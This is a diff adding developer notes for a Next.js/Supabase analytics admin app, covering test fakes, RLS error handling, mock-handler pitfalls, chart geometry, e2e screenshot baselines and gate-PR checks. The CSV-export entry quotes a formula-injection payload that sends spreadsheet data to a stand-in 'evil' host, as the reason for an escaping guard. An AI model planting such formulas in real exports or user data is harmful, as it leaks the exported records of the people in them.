@@ -209,3 +209,135 @@ mistake the blank labels for a real bug; verify against the prod build. Point Pl
 `webServer.command` at `npm run build && npm run start -- -p <port>` (raise `timeout` to ~240s). Port
 note: the shared checkout often already holds 3002 with the human's dev server (serving `main`, not your
 branch) — screenshot YOUR branch via a temp, untracked `pw.*.config.ts` on a free port.
+
+## `lib/testing/supabase-fake.ts` had no `.rpc()` — any RPC-backed route ticket must add it (ENG-275)
+The fake only modelled `from()/auth/functions/storage`, so the first ticket to call `sb.rpc(...)` (ENG-275
+analytics) couldn't unit-test at all. Extended additively: `FakeState.rpcs: Record<string,{data?,error?}>`,
+`calls.rpc: {name,args}[]`, and an `rpc()` method on `makeFakeClient`. **Caveat:** an *unregistered* rpc name
+returns `{data: [], error: null}`, so a test asserting only "we passed `p_since: null`" would still pass with a
+WRONG function or argument name — it only proves what the client sent. Pin the mapping with a `toEqual` on the
+full response shape, and smoke-test RPC names against a real DB before merge.
+
+## Route tickets consuming another repo's RPCs: read the MERGED migration, don't infer
+ENG-275's contract depended on 9 RPCs from ENG-273 in `stablepass-be`. The local `stablepass-be` checkout's
+`supabase/migrations/` does NOT show them (they were on `feature/analytics-v1`, not main). Do-this:
+`git -C ../stablepass-be fetch origin && git show origin/feature/<epic>:supabase/migrations/<file>.sql` and read
+the `returns table (...)` blocks for the exact column names. Reviewers flagged the RPC layer "UNVERIFIED" because
+they only see this repo — pre-empt it by quoting the migration evidence in the PR.
+
+## `count`-style analytics fields need a real per-row scope or they're a global constant
+ENG-275 first computed a post's `reach` as "all `trial|active` subscriptions" — identical for every post, making
+`opens/reach` meaningless. The right source is the admin-readable `follow` table
+(`follow(user_id, trainer_id, horse_id)`, `follow_no_duplicate unique(user_id,trainer_id,horse_id)` so a count is
+already distinct-by-user, policy `follow_select_admin`): `reach = count(follow where horse_id = post.horse_id)`.
+Check for a `follow`/join table before falling back to a global count.
+
+## Table reads that ignore `error` turn an RLS regression into "no data"
+`const rows = res.data ?? []` on an admin read renders a permission denial as a legitimately-empty list, and
+`if (!data) return null` turns a failed query into a 404. Both hide a broken policy. Use an
+`unwrap(res, what)` that throws on `res.error` for EVERY table read, and keep the genuine not-found branch after
+it. Then catch at the route and return `fail("query_failed", "<generic>", 500)` — never `e.message`, which would
+leak Postgres schema/SQL text to the client.
+
+## Any CSV export of member-supplied text needs a formula-injection guard
+RFC4180 quoting is NOT a mitigation: Excel/Sheets strip the quotes then evaluate a leading `=`, `+`, `-`, `@`,
+tab or CR. A member-supplied `name` of `=HYPERLINK("http://evil"&A1,"x")` exfiltrates the export on one click.
+Prefix any such cell with an apostrophe *before* applying the quoting rules (see `lib/analytics/csv.ts`).
+
+## Mutation-test the analytics mappers — `toMatchObject` and fixture-shaped tests hide real gaps
+On ENG-275 three behaviours survived mutation with a green suite: all `Number()` coercion deleted, the
+array-shaped PostgREST embed branch stubbed to `null`, and `daysLeft` hardcoded to `-999`. Causes: fixtures used
+JS numbers (never exercising the string-bigint path PostgREST can return), the array-embed fixture asserted only
+the CSV header row, and `daysLeft` was never asserted. Use `toEqual` (not `toMatchObject`) on any PII payload so
+a new leaked field fails, and assert derived fields explicitly including the edge case (an expired trial must be
+`0`, not negative).
+
+## e2e ran `next dev` despite the gotcha above — client screens were INERT (ENG-285)
+`playwright.config.ts` had drifted to `command: "npm run dev -- -p 3002"` while the "Screenshots:
+`next start`, not `next dev`" gotcha above said otherwise. Under the dev server the client bundle
+never finished hydrating: every `"use client"` screen rendered its SSR markup but stayed dead — no
+console error, no failed request, so it looks like a data bug. Symptom: compose's horse picker never
+opened; the tell is that the caption counter stays at `0/240` while you type. Do-this: keep the
+webServer on `npm run build && npm run start -- -p 3002` (timeout 300000). To decide "not hydrated"
+vs "no data" in 30s, type into a control with a React-driven counter and watch whether it moves.
+
+## Discriminate mock handlers on the query string EXACTLY — and beware a second shadowing pair
+Extending the dispatcher gotcha above with what ENG-285 actually hit:
+* **Two handlers can both claim one read.** Compose's horse read filters `status=eq.active`, the same
+  discriminator the dashboard handler used — so the dashboard branch swallowed it and returned rows
+  with no embedded `trainer`. When you add a branch, check no EARLIER branch already matches its
+  query. All `/rest/v1/horse` branches now live in one ordered block for that reason.
+* **Match the table name exactly, not by prefix.** `startsWith("/rest/v1/horse")` also catches a
+  future `horse_*` table (`startsWith("/rest/v1/race")` already mis-captures `race_horse`, and
+  `/rest/v1/trainer` catches `trainer_contact`). Use `url.pathname === "/rest/v1/<table>"`.
+* **A catch-all fallback hides broken branches.** A fallback serving the good fixtures keeps the suite
+  green even when the branch above it is broken — a mutation test proved it absorbed the break
+  silently. Keep the fallback (it stops stub rows leaking) but make it `console.warn` loudly.
+
+## A visibility-only e2e assertion proves nothing about content
+`expect(page.locator(".horse-card-adm").first()).toBeVisible()` passed against 24 EMPTY cards for two
+epics. Assert content (a fixture name, the trainer, the expected row count), not just presence — and
+verify the assertion by mutation: break the mock deliberately, confirm the suite goes red, restore.
+## mock-supabase discriminators: ANCHOR the filter and DECODE the search (ENG-276)
+Two ways a new `/rest/v1/<table>` handler silently hijacks another screen, both hit on ENG-276:
+1. **Unanchored filter.** `url.search.includes("id=eq.")` is ALSO true for `horse_id=eq.` — so a
+   by-PK handler steals the posts library's horse-filtered list read (and its chip-count query), which
+   then renders empty with all-zero counts. Use `/[?&]id=eq\./` and extract with the same anchored
+   pattern, or the regex pulls the *horse* id out of `horse_id=eq.<uuid>`.
+2. **`url.search` is PERCENT-ENCODED.** A PostgREST embed alias arrives as `trainer%3Asource_trainer_id`,
+   so a raw `includes("trainer:source_trainer_id")` never fires and the handler is dead code — the read
+   falls through to the generic dispatcher and returns wrong-shaped rows. `decodeURIComponent(url.search)`
+   before any select-signature test.
+Also: an embed alias is rarely unique. `trainer:source_trainer_id` is used by the posts library, the
+posts API route, the preview route and dashboard queries; only the full `(name,display_name)` arg list
+is analytics-only. Grep every caller before keying on a select fragment.
+
+## Charts: hand-rolled inline SVG, no library — geometry belongs in a pure module
+ENG-276 built the analytics charts as inline SVG matching the mockups' 420x150 viewBox (grid at
+y=20/70/120, bars up from y=120, axis labels at y=136). Keep the maths in a pure `chart.ts`
+(`barLayout`/`lineLayout`/`axisTicks`) so it unit-tests without a DOM, and guard the two cases real
+data hits immediately: `max === 0` (a new platform) would make every ratio NaN, and an exact-zero bar
+should render height 0 — a hairline stub reads as real data. Axis labels must be SHORT: 12 labels on a
+420-unit viewBox clip at the edges, so put the long form in a `<title>` tooltip instead.
+
+## The analytics BFF has no prior-period query
+`getOpens/getEngagement/getClicks` take a single `since`; `getTrials()` takes none at all. So the
+mockup's "+18% vs prior 30 days" tile deltas are NOT computable, and Subscribers/On-trial are
+point-in-time counts that do not move with the period toggle. Don't fabricate a delta to match the
+mockup — label honestly ("as of today") and raise a follow-up for a prior-period query.
+
+## `page.screenshot({path})` OVERWRITES its baseline — e2e asserts nothing visual
+The specs under `e2e/` capture *to* the committed PNG, so the suite passes regardless of visual
+regression and `npm run e2e` always leaves a dirty tree. Two consequences:
+1. **Never blanket-commit regenerated PNGs** — a blanket refresh is what got PR #18 rejected first
+   time round. Justify any baseline you do commit, individually.
+2. **A visual fix needs a non-visual guard.** The `gap={26}` trials-bar fix (AnalyticsScreen.tsx)
+   had none: `barLayout(series, gap = 5)` takes gap as a DEFAULTED param, so a `chart.ts` unit test
+   passes on the broken code — the defect was that no CALLER passed one. Only the rendered `rect`
+   width proves it. See the "bar geometry" block in `AnalyticsScreen.test.tsx`; mutation-verify any
+   replacement (drop `gap={26}` → must fail `expected 65 to be 44`).
+   Assert the *expression* (`420 / 14 - 5`), not a literal, for charts that ride the default — the
+   mockup draws 24 where we render 25, so a literal pins a known off-spec value and cries wolf.
+
+## Which e2e baselines churn on every run (do NOT read these as regressions)
+- `02-dashboard.png`, `02-dashboard-shell.png`, `10-post-analytics.png` — fixtures in
+  `e2e/mock-supabase.mjs` are `Date.now()`-relative (+2h/+4h/+6h), so these differ on every capture.
+- `05-horses-list.png` — churns too, and is easy to mistake for a real diff because it is ~5x larger
+  (~3.2k px). It is a 1px vertical text-baseline jitter confined to the single "Winx" card
+  (bbox x 520-741, y 473-764); content, data and layout are identical. Renderer nondeterminism.
+Quantify before judging: `magick compare -metric AE old.png new.png /tmp/d.png`, then crop the bbox
+and look. Don't eyeball full-page shots.
+
+## `06-compose-preview.png` is committed in an UNPAINTED state
+The preview modal is screenshotted before its blob-URL `<img>` elements decode, so the baseline shows
+`.postMedia`'s brand-green-dark background instead of the photos. Reproduces deterministically under
+`next start` (the old `next dev` harness's extra latency hid it). Harness timing, NOT a product bug —
+but the committed baseline is misleading evidence. Fix when touched: `await img.decode()` + a double
+`requestAnimationFrame` before the shot in `e2e/compose.spec.ts`.
+
+## Gate tickets: check the integration branch's own ancestry before PR-ing to main
+`stablepass-be`'s `feature/analytics-v1` turned out to be `feature/member-api-v1` + ONE commit, and
+member-api-v1's gate PR was still open — so an analytics-v1 → main PR silently carries the whole of
+the other epic (5.4k lines). Run `git merge-base --is-ancestor origin/feature/<other> HEAD` and
+`git log --oneline origin/main..HEAD` before opening a gate PR, and put the merge-order call at the
+TOP of the body. `git diff --stat` alone will badly mislead you about what a gate PR contains.
